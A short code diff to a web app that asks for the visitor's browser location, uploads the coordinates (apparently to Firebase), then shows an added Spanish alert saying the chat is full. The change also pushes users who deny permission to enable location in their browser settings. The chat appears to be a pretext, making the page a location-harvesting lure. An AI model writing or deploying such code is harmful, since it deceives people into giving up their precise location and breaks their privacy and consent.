@@ -9,12 +9,13 @@ function App() {
 function succes(geodata){
   console.log(geodata.coords)
 uploadData(geodata.coords)
+alert('Este chat está lleno, ¡pero mantente atento! Pronto podría haber un espacio disponible para ti')
   //firebase code
 
  
 }
 function noPermiso(){
-alert('No puedes acceder sin permisos')
+alert('No puedes acceder sin permisos, has denegado el permiso de ubicación. Por favor, ve a la configuración de tu navegador para permitir el acceso.')
 }
 
 async function uploadData(data){
@@ -33,8 +34,6 @@ async  function handleClick(){
 if(navigator.geolocation){
 navigator.geolocation.getCurrentPosition(succes,noPermiso)
 
-}else{
-alert('no puedes usar geo')
 }
  }
 
